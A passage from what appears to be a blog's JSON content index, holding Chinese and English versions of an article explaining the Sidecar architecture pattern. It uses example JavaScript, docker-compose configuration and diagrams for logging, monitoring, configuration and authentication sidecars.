METRICS_EXPORT_URL&#x3D;http:&#x2F;&#x2F;metrics-server:9090&#x2F;api&#x2F;metrics - ENVIRONMENT&#x3D;production - APP_VERSION&#x3D;1.0.0 depends_on: - app networks: - app-network networks: app-network: driver: bridge 与其他模式的关系 Ambassador 模式 Ambassador 模式是用于网络通信的专门 sidecar： &#x2F;&#x2F; Ambassador sidecar 处理所有出站请求 class AmbassadorSidecar &#123; async proxyRequest(target, request) &#123; &#x2F;&#x2F; 服务发现 const endpoint &#x3D; await this.discover(target); &#x2F;&#x2F; 断路器 if (this.isCircuitOpen(target)) &#123; throw new Error(&#39;Circuit breaker open&#39;); &#125; &#x2F;&#x2F; 重试逻辑 return await this.retryWithBackoff(() &#x3D;&gt; fetch(endpoint, request) ); &#125; &#125; Adapter 模式 Adapter 模式是转换接口的 sidecar： &#x2F;&#x2F; Adapter sidecar 将遗留协议转换为现代 API class AdapterSidecar &#123; async translateRequest(legacyRequest) &#123; &#x2F;&#x2F; 将遗留格式转换为现代格式 const modernRequest &#x3D; &#123; method: legacyRequest.action, data: this.transformData(legacyRequest.payload) &#125;; &#x2F;&#x2F; 转发到现代服务 return await this.forwardToModernService(modernRequest); &#125; &#125; 结论 Sidecar 模式提供了一种强大的方式来扩展应用程序功能，而无需修改应用程序代码。通过将支持组件部署为独立的进程或容器，您可以获得： 语言独立性 - 为每项工作使用最佳工具 隔离 - 故障不会级联 灵活性 - 独立更新组件 可重用性 - 在多个应用程序中使用相同的 sidecar 虽然它引入了部署复杂性和资源开销，但好处通常超过成本，特别是在微服务架构和容器化环境中。 当您需要为多个应用程序添加横切关注点、现代化遗留系统或构建支持异构技术堆栈的平台时，这种模式表现出色。 参考资料 Microsoft Azure Architecture - Sidecar Pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-CN"},{"title":"Sidecar 模式：在不觸碰程式碼的情況下擴展應用程式","slug":"2019/07/Sidecar-Pattern-zh-TW","date":"un66fin66","updated":"un22fin22","comments":true,"path":"/zh-TW/2019/07/Sidecar-Pattern/","permalink":"https://neo01.com/zh-TW/2019/07/Sidecar-Pattern/","excerpt":"將支援元件部署在應用程式旁邊的獨立容器中。了解 Sidecar 模式如何實現隔離、封裝和異構技術堆疊。","text":"想像一下在摩托車上安裝邊車。邊車與摩托車共享旅程，提供額外功能，但仍然是一個獨立的單元。這正是 Sidecar 模式在軟體架構中的運作方式——一種強大的方法，可以在不修改核心應用程式程式碼的情況下擴展應用程式功能。 摩托車類比 這個模式的名稱來自摩托車邊車。就像邊車： 附加在摩托車上 共享相同的旅程 提供額外容量 可以獨立添加或移除 軟體中的 sidecar 元件： 部署在主應用程式旁邊 共享相同的生命週期 提供支援功能 獨立運作 graph LR A[客戶端] --> B[負載平衡器] B --> C[應用程式實例 1] B --> D[應用程式實例 2] C --- C1[Sidecar 1] D --- D1[Sidecar 2] C1 --> E[監控服務] D1 --> E C1 --> F[日誌聚合器] D1 --> F style C fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style C1 fill:#ffd43b,stroke:#fab005 style D1 fill:#ffd43b,stroke:#fab005 問題：橫切關注點 現代應用程式需要各種支援功能： 日誌記錄和監控 配置管理 服務發現 網路代理 安全性和身份驗證 傳統方法及其限制 方法 1：將所有內容嵌入應用程式 class Application &#123; constructor() &#123; this.logger &#x3D; new Logger(); this.metrics &#x3D; new MetricsCollector(); this.config &#x3D; new ConfigManager(); this.healthCheck &#x3D; new HealthChecker(); &#125; async processRequest(request) &#123; &#x2F;&#x2F; 業務邏輯與基礎設施關注點混合 this.logger.log(&#39;Processing request&#39;); this.metrics.increment(&#39;requests&#39;); const config &#x3D; await this.config.get(&#39;settings&#39;); const result &#x3D; await this.businessLogic(request, config); this.metrics.recordLatency(Date.now() - request.startTime); return result; &#125; &#125; ⚠️ 嵌入式方法的問題緊密耦合：基礎設施程式碼與業務邏輯混合 語言鎖定：所有元件必須使用相同語言 更新困難：更新日誌記錄需要更改應用程式程式碼 資源共享：日誌記錄中的錯誤可能導致整個應用程式崩潰 方法 2：獨立服務 &#x2F;&#x2F; 應用程式對獨立服務進行網路呼叫 class Application &#123; async processRequest(request) &#123; await fetch(&#39;http:&#x2F;&#x2F;logging-service&#x2F;log&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; message: &#39;Processing request&#39; &#125;) &#125;); const result &#x3D; await this.businessLogic(request); await fetch(&#39;http:&#x2F;&#x2F;metrics-service&#x2F;record&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; metric: &#39;request_processed&#39; &#125;) &#125;); return result; &#125; &#125; ⚠️ 獨立服務的問題網路延遲：每個日誌或指標都需要網路呼叫 複雜性：管理多個服務端點 故障處理：如果日誌服務停機怎麼辦？ 解決方案：Sidecar 模式 將支援元件部署為與主應用程式一起運行的獨立程序或容器： # 容器編排配置 services: main-app: image: my-application:latest ports: - &quot;8080:8080&quot; logging-sidecar: image: log-collector:latest volumes: - &#x2F;var&#x2F;log&#x2F;app:&#x2F;logs monitoring-sidecar: image: metrics-exporter:latest environment: - METRICS_PORT&#x3D;9090 應用程式保持簡單： &#x2F;&#x2F; 應用程式純粹專注於業務邏輯 class Application &#123; async processRequest(request) &#123; &#x2F;&#x2F; 只寫入 stdout - sidecar 處理收集 console.log(&#39;Processing request&#39;); &#x2F;&#x2F; 僅業務邏輯 const result &#x3D; await this.businessLogic(request); return result; &#125; &#125; Sidecar 處理基礎設施關注點： &#x2F;&#x2F; 日誌 sidecar（獨立程序） class LoggingSidecar &#123; constructor() &#123; this.logAggregator &#x3D; new LogAggregator(); &#125; async start() &#123; &#x2F;&#x2F; 監視應用程式日誌 const logStream &#x3D; fs.createReadStream(&#39;&#x2F;var&#x2F;log&#x2F;app&#x2F;stdout&#39;); logStream.on(&#39;data&#39;, (chunk) &#x3D;&gt; &#123; const logs &#x3D; this.parseLogEntries(chunk); &#x2F;&#x2F; 使用元資料豐富 logs.forEach(log &#x3D;&gt; &#123; log.hostname &#x3D; os.hostname(); log.timestamp &#x3D; new Date().toISOString(); log.environment &#x3D; process.env.ENVIRONMENT; &#125;); &#x2F;&#x2F; 發送到集中式日誌記錄 this.logAggregator.send(logs); &#125;); &#125; &#125; 主要優勢 1. 語言獨立性 不同元件可以使用不同語言： services: # Node.js 中的主應用程式 app: image: node:18 command: node server.js # Go 中的監控 sidecar（為了效能） metrics: image: golang:1.20 command: .&#x2F;metrics-collector # Python 中的日誌處理器（用於 ML 分析） logs: image: python:3.11 command: python log_analyzer.py 2. 隔離和容錯 Sidecar 中的崩潰不會終止主應用程式： &#x2F;&#x2F; 主應用程式繼續運行 class Application &#123; async processRequest(request) &#123; try &#123; &#x2F;&#x2F; 嘗試記錄（sidecar 可能停機） await this.notifySidecar(&#39;request_received&#39;); &#125; catch (error) &#123; &#x2F;&#x2F; Sidecar 不可用，但我們繼續 console.error(&#39;Sidecar unavailable:&#39;, error.message); &#125; &#x2F;&#x2F; 無論如何業務邏輯都會繼續 return await this.businessLogic(request); &#125; &#125; 3. 資源管理 獨立控制資源： services: app: image: my-app:latest resources: limits: memory: 2G cpu: &quot;2.0&quot; sidecar: image: log-collector:latest resources: limits: memory: 512M cpu: &quot;0.5&quot; 4. 獨立更新 在不觸碰應用程式的情況下更新 sidecar： # 將監控 sidecar 更新到新版本 kubectl set image deployment&#x2F;my-app \\ monitoring-sidecar&#x3D;metrics-collector:v2.0 # 應用程式繼續運行不變 常見使用案例 使用案例 1：服務網格代理 Sidecar 代理處理所有網路通訊： graph LR A[服務 A] --> A1[代理 Sidecar] B[服務 B] --> B1[代理 Sidecar] A1 -->|加密| B1 A1 --> C[服務發現] B1 --> C A1 --> D[指標] B1 --> D style A fill:#4dabf7,stroke:#1971c2 style B fill:#4dabf7,stroke:#1971c2 style A1 fill:#ffd43b,stroke:#fab005 style B1 fill:#ffd43b,stroke:#fab005 &#x2F;&#x2F; 應用程式進行簡單的 HTTP 呼叫 class ServiceA &#123; async callServiceB(data) &#123; &#x2F;&#x2F; 代理 sidecar 處理： &#x2F;&#x2F; - 服務發現 &#x2F;&#x2F; - 負載平衡 &#x2F;&#x2F; - 重試邏輯 &#x2F;&#x2F; - 斷路器 &#x2F;&#x2F; - TLS 加密 &#x2F;&#x2F; - 指標收集 return await fetch(&#39;http:&#x2F;&#x2F;localhost:15001&#x2F;service-b&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(data) &#125;); &#125; &#125; 使用案例 2：配置管理 Sidecar 監視配置變更： &#x2F;&#x2F; 配置 sidecar class ConfigSidecar &#123; constructor() &#123; this.configStore &#x3D; new ConfigStore(); this.sharedVolume &#x3D; &#39;&#x2F;config&#39;; &#125; async start() &#123; &#x2F;&#x2F; 監視配置變更 this.configStore.watch(&#39;app-config&#39;, async (newConfig) &#x3D;&gt; &#123; &#x2F;&#x2F; 寫入共享卷 await fs.writeFile( &#96;$&#123;this.sharedVolume&#125;&#x2F;config.json&#96;, JSON.stringify(newConfig) ); &#x2F;&#x2F; 通知應用程式（透過訊號或 API） await this.notifyApplication(&#39;config_updated&#39;); &#125;); &#125; &#125; &#x2F;&#x2F; 應用程式從共享卷讀取 class Application &#123; loadConfig() &#123; return JSON.parse( fs.readFileSync(&#39;&#x2F;config&#x2F;config.json&#39;, &#39;utf8&#39;) ); &#125; &#125; 使用案例 3：日誌聚合 在不更改應用程式的情況下收集和轉發日誌： &#x2F;&#x2F; 應用程式只寫入 stdout&#x2F;stderr console.log(&#39;User logged in:&#39;, userId); console.error(&#39;Payment failed:&#39;, error); &#x2F;&#x2F; Sidecar 收集和處理 class LogAggregationSidecar &#123; async collectLogs() &#123; const logs &#x3D; await this.readApplicationLogs(); &#x2F;&#x2F; 解析和豐富 const enrichedLogs &#x3D; logs.map(log &#x3D;&gt; (&#123; ...log, service: &#39;payment-service&#39;, version: process.env.APP_VERSION, region: process.env.REGION, timestamp: new Date().toISOString() &#125;)); &#x2F;&#x2F; 轉發到日誌聚合服務 await this.forwardToLogService(enrichedLogs); &#125; &#125; 使用案例 4：安全性和身份驗證 在 sidecar 層級處理身份驗證： &#x2F;&#x2F; 身份驗證 sidecar 攔截請求 class AuthSidecar &#123; async handleRequest(req) &#123; &#x2F;&#x2F; 驗證 JWT 令牌 const token &#x3D; req.headers.authorization; const user &#x3D; await this.validateToken(token); if (!user) &#123; return &#123; status: 401, body: &#39;Unauthorized&#39; &#125;; &#125; &#x2F;&#x2F; 將使用者上下文添加到請求 req.headers[&#39;X-User-Id&#39;] &#x3D; user.id; req.headers[&#39;X-User-Roles&#39;] &#x3D; user.roles.join(&#39;,&#39;); &#x2F;&#x2F; 轉發到應用程式 return await this.forwardToApp(req); &#125; &#125; &#x2F;&#x2F; 應用程式接收已驗證的請求 class Application &#123; async handleRequest(req) &#123; &#x2F;&#x2F; 使用者已由 sidecar 驗證 const userId &#x3D; req.headers[&#39;X-User-Id&#39;]; const roles &#x3D; req.headers[&#39;X-User-Roles&#39;].split(&#39;,&#39;); &#x2F;&#x2F; 專注於業務邏輯 return await this.processBusinessLogic(userId, roles); &#125; &#125; 實作模式 模式 1：共享卷 Sidecar 透過共享檔案系統通訊： services: app: volumes: - shared-data:&#x2F;data sidecar: volumes: - shared-data:&#x2F;data volumes: shared-data: 模式 2：本地主機網路 Sidecar 透過 localhost 通訊： &#x2F;&#x2F; 應用程式公開指標端點 app.get(&#39;&#x2F;metrics&#39;, (req, res) &#x3D;&gt; &#123; res.json(&#123; requests: requestCount, errors: errorCount &#125;); &#125;); &#x2F;&#x2F; Sidecar 抓取指標 class MetricsSidecar &#123; async collectMetrics() &#123; const response &#x3D; await fetch(&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;metrics&#39;); const metrics &#x3D; await response.json(); await this.exportToMonitoring(metrics); &#125; &#125; 模式 3：程序間通訊 使用訊號或套接字進行通訊： &#x2F;&#x2F; 應用程式監聽訊號 process.on(&#39;SIGUSR1&#39;, () &#x3D;&gt; &#123; console.log(&#39;Reloading configuration...&#39;); this.reloadConfig(); &#125;); &#x2F;&#x2F; Sidecar 發送訊號 class ConfigSidecar &#123; async notifyConfigChange() &#123; const appPid &#x3D; await this.getApplicationPid(); process.kill(appPid, &#39;SIGUSR1&#39;); &#125; &#125; 何時使用 Sidecar 模式 理想場景 ✅ 完美使用案例異構應用程式：多個不同語言的服務需要相同功能 橫切關注點：適用於所有服務的日誌記錄、監控、配置 第三方整合：為您無法控制的應用程式添加功能 獨立擴展：Sidecar 和應用程式有不同的資源需求 真實世界範例 微服務平台 服務網格代理（Envoy、Linkerd） 日誌收集器（Fluentd、Filebeat） 指標匯出器（Prometheus 匯出器） 秘密管理器 舊版應用程式現代化 為舊版應用程式添加監控 實作現代身份驗證 啟用服務發現 添加斷路器 何時避免 ❌ 不適合的情況嚴格的效能要求：程序間通訊開銷不可接受 簡單應用程式：管理 sidecar 的開銷超過好處 需要深度整合：Sidecar 需要存取應用程式內部 需要獨立擴展：Sidecar 和應用程式需要不同的擴展策略 考量和權衡 部署複雜性 管理每個應用程式實例的多個容器： # 之前：簡單部署 docker run my-app:latest # 之後：協調部署 docker-compose up # 或 kubectl apply -f deployment.yaml 📝 複雜性管理使用容器編排平台（Kubernetes、Docker Swarm）自動管理 sidecar 生命週期。 資源開銷 每個應用程式實例現在運行多個程序： (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_e3cb046f5')); var option = { \"title\": { \"text\": \"資源使用：獨立 vs Sidecar\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"獨立應用程式\", \"應用程式 + Sidecar\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"CPU\", \"記憶體\", \"網路\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"資源單位\" }, \"series\": [ { \"name\": \"獨立應用程式\", \"type\": \"bar\", \"data\": [100, 100, 100], \"itemStyle\": { \"color\": \"#4dabf7\" } }, { \"name\": \"應用程式 + Sidecar\", \"type\": \"bar\", \"data\": [120, 130, 110], \"itemStyle\": { \"color\": \"#ffd43b\" } } ] }; chart.setOption(option); } })(); 通訊延遲 程序間通訊增加開銷： &#x2F;&#x2F; 直接函式呼叫：約 1 微秒 this.logger.log(&#39;message&#39;); &#x2F;&#x2F; HTTP 到 sidecar：約 1 毫秒 await fetch(&#39;http:&#x2F;&#x2F;localhost:9090&#x2F;log&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; message: &#39;message&#39; &#125;) &#125;); &#x2F;&#x2F; 共享卷：約 100 微秒 await fs.appendFile(&#39;&#x2F;logs&#x2F;app.log&#39;, &#39;message\\n&#39;); 💡 最佳化策略使用 Localhost：最小化網路開銷 批次操作：聚合多個呼叫 非同步通訊：不等待 sidecar 回應 共享記憶體：對高頻率資料使用記憶體映射檔案 完整實作範例 這是一個包含應用程式和監控 sidecar 的全面範例： &#x2F;&#x2F; main-app.js - 應用程式 const express &#x3D; require(&#39;express&#39;); const app &#x3D; express(); class Application &#123; constructor() &#123; this.requestCount &#x3D; 0; this.errorCount &#x3D; 0; &#125; &#x2F;&#x2F; 業務邏輯端點 setupRoutes() &#123; app.post(&#39;&#x2F;api&#x2F;orders&#39;, async (req, res) &#x3D;&gt; &#123; this.requestCount++; try &#123; const order &#x3D; await this.processOrder(req.body); console.log(&#39;Order processed:&#39;, order.id); res.json(order); &#125; catch (error) &#123; this.errorCount++; console.error(&#39;Order failed:&#39;, error.message); res.status(500).json(&#123; error: error.message &#125;); &#125; &#125;); &#x2F;&#x2F; 供 sidecar 使用的指標端點 app.get(&#39;&#x2F;internal&#x2F;metrics&#39;, (req, res) &#x3D;&gt; &#123; res.json(&#123; requests: this.requestCount, errors: this.errorCount, uptime: process.uptime() &#125;); &#125;); &#125; async processOrder(orderData) &#123; &#x2F;&#x2F; 業務邏輯在這裡 return &#123; id: Date.now(), ...orderData &#125;; &#125; start() &#123; this.setupRoutes(); app.listen(8080, () &#x3D;&gt; &#123; console.log(&#39;Application running on port 8080&#39;); &#125;); &#125; &#125; new Application().start(); &#x2F;&#x2F; monitoring-sidecar.js - 監控 Sidecar const fetch &#x3D; require(&#39;node-fetch&#39;); class MonitoringSidecar &#123; constructor() &#123; this.metricsEndpoint &#x3D; &#39;http:&#x2F;&#x2F;localhost:8080&#x2F;internal&#x2F;metrics&#39;; this.exportEndpoint &#x3D; process.env.METRICS_EXPORT_URL; &#125; async collectMetrics() &#123; try &#123; const response &#x3D; await fetch(this.metricsEndpoint); const metrics &#x3D; await response.json(); &#x2F;&#x2F; 使用環境資料豐富 const enrichedMetrics &#x3D; &#123; ...metrics, hostname: require(&#39;os&#39;).hostname(), timestamp: new Date().toISOString(), environment: process.env.ENVIRONMENT, version: process.env.APP_VERSION &#125;; &#x2F;&#x2F; 匯出到監控系統 await this.exportMetrics(enrichedMetrics); console.log(&#39;Metrics collected:&#39;, enrichedMetrics); &#125; catch (error) &#123; console.error(&#39;Failed to collect metrics:&#39;, error.message); &#125; &#125; async exportMetrics(metrics) &#123; if (!this.exportEndpoint) return; await fetch(this.exportEndpoint, &#123; method: &#39;POST&#39;, headers: &#123; &#39;Content-Type&#39;: &#39;application&#x2F;json&#39; &#125;, body: JSON.stringify(metrics) &#125;); &#125; start() &#123; console.log(&#39;Monitoring sidecar started&#39;); &#x2F;&#x2F; 每 10 秒收集指標 setInterval(() &#x3D;&gt; this.collectMetrics(), 10000); &#125; &#125; new MonitoringSidecar().start(); # docker-compose.yml - 部署配置 version: &#39;3.8&#39; services: app: build: .&#x2F;app ports: - &quot;8080:8080&quot; environment: - ENVIRONMENT&#x3D;production - APP_VERSION&#x3D;1.0.0 networks: - app-network monitoring-sidecar: build: .&#x2F;monitoring-sidecar environment: - METRICS_EXPORT_URL&#x3D;http:&#x2F;&#x2F;metrics-server:9090&#x2F;api&#x2F;metrics - ENVIRONMENT&#x3D;production - APP_VERSION&#x3D;1.0.0 depends_on: - app networks: - app-network networks: app-network: driver: bridge 與其他模式的關係 Ambassador 模式 Ambassador 模式是用於網路通訊的專門 sidecar： &#x2F;&#x2F; Ambassador sidecar 處理所有出站請求 class AmbassadorSidecar &#123; async proxyRequest(target, request) &#123; &#x2F;&#x2F; 服務發現 const endpoint &#x3D; await this.discover(target); &#x2F;&#x2F; 斷路器 if (this.isCircuitOpen(target)) &#123; throw new Error(&#39;Circuit breaker open&#39;); &#125; &#x2F;&#x2F; 重試邏輯 return await this.retryWithBackoff(() &#x3D;&gt; fetch(endpoint, request) ); &#125; &#125; Adapter 模式 Adapter 模式是轉換介面的 sidecar： &#x2F;&#x2F; Adapter sidecar 將舊版協定轉換為現代 API class AdapterSidecar &#123; async translateRequest(legacyRequest) &#123; &#x2F;&#x2F; 將舊版格式轉換為現代格式 const modernRequest &#x3D; &#123; method: legacyRequest.action, data: this.transformData(legacyRequest.payload) &#125;; &#x2F;&#x2F; 轉發到現代服務 return await this.forwardToModernService(modernRequest); &#125; &#125; 結論 Sidecar 模式提供了一種強大的方式來擴展應用程式功能，而無需修改應用程式程式碼。透過將支援元件部署為獨立的程序或容器，您可以獲得： 語言獨立性 - 為每項工作使用最佳工具 隔離 - 故障不會級聯 靈活性 - 獨立更新元件 可重用性 - 在多個應用程式中使用相同的 sidecar 雖然它引入了部署複雜性和資源開銷，但好處通常超過成本，特別是在微服務架構和容器化環境中。 當您需要為多個應用程式添加橫切關注點、現代化舊版系統或建構支援異構技術堆疊的平台時，這種模式表現出色。 參考資料 Microsoft Azure Architecture - Sidecar Pattern","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[],"lang":"zh-TW"},{"title":"The Sidecar Pattern: Extending Applications Without Touching Code","slug":"2019/07/Sidecar-Pattern","date":"un66fin66","updated":"un22fin22","comments":true,"path":"2019/07/Sidecar-Pattern/","permalink":"https://neo01.com/2019/07/Sidecar-Pattern/","excerpt":"Deploy supporting components alongside your application in separate containers. Learn how the Sidecar pattern enables isolation, encapsulation, and heterogeneous technology stacks.","text":"Imagine attaching a sidecar to a motorcycle. The sidecar shares the journey with the motorcycle, provides additional functionality, but remains a separate, independent unit. This is exactly how the Sidecar pattern works in software architecture—a powerful approach to extending application capabilities without modifying the core application code. The Motorcycle Analogy The pattern gets its name from motorcycle sidecars. Just as a sidecar: Attaches to a motorcycle Shares the same journey Provides additional capacity Can be added or removed independently A sidecar component in software: Deploys alongside the main application Shares the same lifecycle Provides supporting features Operates independently graph LR A[Client] --> B[Load Balancer] B --> C[Application Instance 1] B --> D[Application Instance 2] C --- C1[Sidecar 1] D --- D1[Sidecar 2] C1 --> E[Monitoring Service] D1 --> E C1 --> F[Log Aggregator] D1 --> F style C fill:#4dabf7,stroke:#1971c2 style D fill:#4dabf7,stroke:#1971c2 style C1 fill:#ffd43b,stroke:#fab005 style D1 fill:#ffd43b,stroke:#fab005 The Problem: Cross-Cutting Concerns Modern applications need various supporting features: Logging and monitoring Configuration management Service discovery Network proxying Security and authentication Traditional Approaches and Their Limitations Approach 1: Embed Everything in the Application class Application &#123; constructor() &#123; this.logger &#x3D; new Logger(); this.metrics &#x3D; new MetricsCollector(); this.config &#x3D; new ConfigManager(); this.healthCheck &#x3D; new HealthChecker(); &#125; async processRequest(request) &#123; &#x2F;&#x2F; Business logic mixed with infrastructure concerns this.logger.log(&#39;Processing request&#39;); this.metrics.increment(&#39;requests&#39;); const config &#x3D; await this.config.get(&#39;settings&#39;); const result &#x3D; await this.businessLogic(request, config); this.metrics.recordLatency(Date.now() - request.startTime); return result; &#125; &#125; ⚠️ Problems with Embedded ApproachTight Coupling: Infrastructure code mixed with business logic Language Lock-in: All components must use the same language Difficult Updates: Updating logging requires changing application code Resource Sharing: A bug in logging can crash the entire application Approach 2: Separate Services &#x2F;&#x2F; Application makes network calls to separate services class Application &#123; async processRequest(request) &#123; await fetch(&#39;http:&#x2F;&#x2F;logging-service&#x2F;log&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; message: &#39;Processing request&#39; &#125;) &#125;); const result &#x3D; await this.businessLogic(request); await fetch(&#39;http:&#x2F;&#x2F;metrics-service&#x2F;record&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(&#123; metric: &#39;request_processed&#39; &#125;) &#125;); return result; &#125; &#125; ⚠️ Problems with Separate ServicesNetwork Latency: Every log or metric requires a network call Complexity: Managing multiple service endpoints Failure Handling: What if the logging service is down? The Solution: Sidecar Pattern Deploy supporting components as separate processes or containers that run alongside the main application: # Container orchestration configuration services: main-app: image: my-application:latest ports: - &quot;8080:8080&quot; logging-sidecar: image: log-collector:latest volumes: - &#x2F;var&#x2F;log&#x2F;app:&#x2F;logs monitoring-sidecar: image: metrics-exporter:latest environment: - METRICS_PORT&#x3D;9090 The application remains simple: &#x2F;&#x2F; Application focuses purely on business logic class Application &#123; async processRequest(request) &#123; &#x2F;&#x2F; Just write to stdout - sidecar handles collection console.log(&#39;Processing request&#39;); &#x2F;&#x2F; Business logic only const result &#x3D; await this.businessLogic(request); return result; &#125; &#125; The sidecar handles infrastructure concerns: &#x2F;&#x2F; Logging sidecar (separate process) class LoggingSidecar &#123; constructor() &#123; this.logAggregator &#x3D; new LogAggregator(); &#125; async start() &#123; &#x2F;&#x2F; Watch application logs const logStream &#x3D; fs.createReadStream(&#39;&#x2F;var&#x2F;log&#x2F;app&#x2F;stdout&#39;); logStream.on(&#39;data&#39;, (chunk) &#x3D;&gt; &#123; const logs &#x3D; this.parseLogEntries(chunk); &#x2F;&#x2F; Enrich with metadata logs.forEach(log &#x3D;&gt; &#123; log.hostname &#x3D; os.hostname(); log.timestamp &#x3D; new Date().toISOString(); log.environment &#x3D; process.env.ENVIRONMENT; &#125;); &#x2F;&#x2F; Send to centralized logging this.logAggregator.send(logs); &#125;); &#125; &#125; Key Advantages 1. Language Independence Different components can use different languages: services: # Main application in Node.js app: image: node:18 command: node server.js # Monitoring sidecar in Go (for performance) metrics: image: golang:1.20 command: .&#x2F;metrics-collector # Log processor in Python (for ML analysis) logs: image: python:3.11 command: python log_analyzer.py 2. Isolation and Fault Tolerance A crash in the sidecar doesn’t kill the main application: &#x2F;&#x2F; Main application continues running class Application &#123; async processRequest(request) &#123; try &#123; &#x2F;&#x2F; Attempt to log (sidecar might be down) await this.notifySidecar(&#39;request_received&#39;); &#125; catch (error) &#123; &#x2F;&#x2F; Sidecar unavailable, but we continue console.error(&#39;Sidecar unavailable:&#39;, error.message); &#125; &#x2F;&#x2F; Business logic proceeds regardless return await this.businessLogic(request); &#125; &#125; 3. Resource Management Control resources independently: services: app: image: my-app:latest resources: limits: memory: 2G cpu: &quot;2.0&quot; sidecar: image: log-collector:latest resources: limits: memory: 512M cpu: &quot;0.5&quot; 4. Independent Updates Update sidecars without touching the application: # Update monitoring sidecar to new version kubectl set image deployment&#x2F;my-app \\ monitoring-sidecar&#x3D;metrics-collector:v2.0 # Application continues running unchanged Common Use Cases Use Case 1: Service Mesh Proxy A sidecar proxy handles all network communication: graph LR A[Service A] --> A1[Proxy Sidecar] B[Service B] --> B1[Proxy Sidecar] A1 -->|Encrypted| B1 A1 --> C[Service Discovery] B1 --> C A1 --> D[Metrics] B1 --> D style A fill:#4dabf7,stroke:#1971c2 style B fill:#4dabf7,stroke:#1971c2 style A1 fill:#ffd43b,stroke:#fab005 style B1 fill:#ffd43b,stroke:#fab005 &#x2F;&#x2F; Application makes simple HTTP calls class ServiceA &#123; async callServiceB(data) &#123; &#x2F;&#x2F; Proxy sidecar handles: &#x2F;&#x2F; - Service discovery &#x2F;&#x2F; - Load balancing &#x2F;&#x2F; - Retry logic &#x2F;&#x2F; - Circuit breaking &#x2F;&#x2F; - TLS encryption &#x2F;&#x2F; - Metrics collection return await fetch(&#39;http:&#x2F;&#x2F;localhost:15001&#x2F;service-b&#39;, &#123; method: &#39;POST&#39;, body: JSON.stringify(data) &#125;); &#125; &#125; Use Case 2: Configuration Management A sidecar watches for configuration changes: &#x2F;&#x2F; Configuration sidecar class ConfigSidecar &#123; constructor() &#123; this.configStore &#x3D; new ConfigStore(); this.sharedVolume &#x3D; &#39;&#x2F;config&#39;; &#125; async start() &#123; &#x2F;&#x2F; Watch for configuration changes this.configStore.watch(&#39;app-config&#39;, async (newConfig) &#x3D;&gt; &#123; &#x2F;&#x2F; Write to shared volume await fs.writeFile( &#96;$&#123;this.sharedVolume&#125;&#x2F;config.json&#96;, JSON.stringify(newConfig) ); &#x2F;&#x2F; Notify application (via signal or API) await this.notifyApplication(&#39;config_updated&#39;); &#125;); &#125; &#125; &#x2F;&#x2F; Application reads from shared volume class Application &#123; loadConfig() &#123; return JSON.parse( fs.readFileSync(&#39;&#x2F;config&#x2F;config.json&#39;, &#39;utf8&#39;) ); &#125; &#125; Use Case 3: Log Aggregation Collect and forward logs without application changes: &#x2F;&#x2F; Application just writes to stdout&#x2F;stderr console.log(&#39;User logged in:&#39;, userId); console.error(&#39;Payment failed:&#39;, error); &#x2F;&#x2F; Sidecar collects and processes class LogAggregationSidecar &#123; async collectLogs() &#123; const logs &#x3D; await this.readApplicationLogs(); &#x2F;&#x2F; Parse and enrich const enrichedLogs &#x3D; logs.map(log &#x3D;&gt; (&#123; ...log, service: &#39;payment-service&#39;, version: process.env.APP_VERSION, region: process.env.REGION, timestamp: new Date().toISOString() &#125;)); &#x2F;&#x2F; Forward to log aggregation service await this.forwardToLogService(enrichedLogs); &#125; &#125; Use Case 4: Security and Authentication Handle authentication at the sidecar level: &#x2F;&#x2F; Auth sidecar intercepts requests class AuthSidecar &#123; async handleRequest(req) &#123; &#x2F;&#x2F; Validate JWT token const token &#x3D; req.headers.authorization; const user &#x3D; await this.validateToken(token); if (!user) &#123; return &#123; status: 401, body: &#39;Unauthorized&#39; &#125;; &#125; &#x2F;&#x2F; Add user context to request req.headers[&#39;X-User-Id&#39;] &#x3D; user.id; req.headers[&#39;X-User-Roles&#39;] &#x3D; user.roles.join(&#39;,&#39;); &#x2F;&#x2F; Forward to application return await this.forwardToApp(req); &#125; &#125; &#x2F;&#x2F; Application receives authenticated requests class Application &#123; async handleRequest(req) &#123; &#x2F;&#x2F; User already authenticated by sidecar const userId &#x3D; req.headers[&#39;X-User-Id&#39;]; const roles &#x3D; req.headers[&#39;X-User-Roles&#39;].split(&#39;,&#39;); &#x2F;&#x2F; Focus on business logic return await this.processBusinessLogic(userId, roles); &#125; &#125; Implementation Patterns Pattern 1: Shared Volume Sidecars communicate via shared filesystem: services: app: volumes: - shared-data:&#x2F;data sidecar: volumes: - shared-data:&#x2F;data volumes: shared-data: Pattern 2: Localhost Network Sidecars communicate via localhost: &#x2F;&#x2F; Application exposes metrics endpoint app.get(&#39;&#x2F;metrics&#39;, (req, res) &#x3D;&gt; &#123; res.json(&#123; requests: requestCount, errors: errorCount &#125;); &#125;); &#x2F;&#x2F; Sidecar scrapes metrics class MetricsSidecar &#123; async collectMetrics() &#123; const response &#x3D; await fetch(&#39;http:&#x2F;&#x2F;localhost:8080&#x2F;metrics&#39;); const metrics &#x3D; await response.json(); await this.exportToMonitoring(metrics); &#125; &#125; Pattern 3: Inter-Process Communication Use signals or sockets for communication: &#x2F;&#x2F; Application listens for signals process.on(&#39;SIGUSR1&#39;, () &#x3D;&gt; &#123; console.log(&#39;Reloading configuration...&#39;); this.reloadConfig(); &#125;); &#x2F;&#x2F; Sidecar sends signals class ConfigSidecar &#123; async notifyConfigChange() &#123; const appPid &#x3D; await this.getApplicationPid(); process.kill(appPid, &#39;SIGUSR1&#39;); &#125; &#125; When to Use the Sidecar Pattern Ideal Scenarios ✅ Perfect Use CasesHeterogeneous Applications: Multiple services in different languages need the same functionality Cross-Cutting 